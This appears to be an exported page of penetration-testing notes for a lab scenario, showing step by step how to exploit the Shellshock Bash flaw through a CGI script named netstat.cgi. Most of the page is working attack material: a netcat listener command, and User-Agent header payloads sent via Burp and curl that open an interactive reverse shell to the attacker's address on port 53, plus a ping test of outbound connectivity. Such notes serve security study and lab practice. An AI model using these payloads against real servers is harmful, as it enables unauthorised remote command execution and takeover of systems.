<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>2. Exploit</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>2. Exploit</h1><br/><strong>Exploit</strong><br />In this test scenario<br />   ◇ attackerIp → 192.168.147.139<br />   ◇ target → http://example.org/cgi-bin/netstat.cgi<br /><span style="text-decoration:underline;">1. set up listener on the attacker machine</span><br />    <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># nc -nvlp 53</pre></div><br />        <a href=""><img src="images/1497-1.png" alt="images/1497-1.png" /></a><br /><br /><span style="text-decoration:underline;">2. Exploit </span><br />On the Web Application we have found <span style="text-decoration:underline;">netstat.cgi</span> is a simple CGI (Common Gateway Interface) file that displays the output from the netstat -nlt command. This page exists to check the local network connections of a web server, without requiring logging in locally to run the netstat command<br />   <a href=""><img src="images/1497-2.png" alt="images/1497-2.png" /></a><br />    This is how look the file netstat.cgi file if we look at it from the local machine.<br />    <a href=""><img src="images/1497-3.png" alt="images/1497-3.png" /></a><br />    The assumption here is that the server is not only running a vulnerable version of Bash, but also that it is passing CGI environment variables to Bash. The most obvious and likely CGI environment variables for us to target are HTTP_USER_AGENT, HTTP_COOKIE, and HTTP_REFERER<br />   ◇ <strong>Exploit using Burp</strong><br />       Intercept the request for the vulnerable file netstat.cgi and change the header User-Agent<br />       <div class="codebox"><pre>User-Agent<span style="color:#ff9d00;font-weight:700">:</span> <span style="color:#ff9d00;font-weight:700">()</span> <span style="color:#ff9d00;font-weight:700">{</span> <span style="color:#ff9d00;font-weight:700">:;</span> <span style="color:#ff9d00;font-weight:700">};</span> <span style="color:#ff9d00;font-weight:700">echo;</span> <span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/bash</span> -i &gt;<span style="color:#ff9d00;font-weight:700">&amp;</span> <span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>tcp<span style="color:#ff9d00;font-weight:700">/</span>192.168.147.139<span style="color:#ff9d00;font-weight:700">/</span>53 <span style="color:#ff9d00;font-weight:700">0&gt;&amp;</span>1</pre></div><br />       <a href=""><img src="images/1497-4.png" alt="images/1497-4.png" /></a><br />       <a href=""><img src="images/1497-5.png" alt="images/1497-5.png" /></a><br />   ◇ <strong>Exploit using CURL</strong><br />       The syntax is <code>curl -A &quot;&lt;User-Agent&gt;&quot; &lt;URL&gt;</code><br />      1- T<span style="text-decoration:underline;">est outbound connectivity of the target on port 53</span><br />           <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># curl -H <span style="color:#3ad900;font-weight:400">&#39;User-Agent: () { :; }; /bin/bash -c &#39;</span><span style="color:#ff9d00;font-weight:700">ping</span> -c 3 192.168.147.139<span style="color:#ff9d00;font-weight:700">:</span>53<span style="color:#3ad900;font-weight:400">&#39;&#39;</span> http<span style="color:#ff9d00;font-weight:700">://</span>example.org<span style="color:#ff9d00;font-weight:700">/</span>cgi-bin<span style="color:#ff9d00;font-weight:700">/</span>netstat.cgi</pre></div><br />           <a href=""><img src="images/1497-6.png" alt="images/1497-6.png" /></a><br />      2- start a reverse shell on port 53<br />           <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># curl -H <span style="color:#3ad900;font-weight:400">&#39;User-Agent: () { :; }; echo; /bin/bash -i &gt;&amp; /dev/tcp/192.168.147.139/53 0&gt;&amp;1&#39;</span> http<span style="color:#ff9d00;font-weight:700">://</span>example.org<span style="color:#ff9d00;font-weight:700">/</span>cgi-bin<span style="color:#ff9d00;font-weight:700">/</span>netstat.cgi</pre></div><br />           <a href=""><img src="images/1497-7.png" alt="images/1497-7.png" /></a><br /><br />    <br /><br /></div>
</body>
</html>
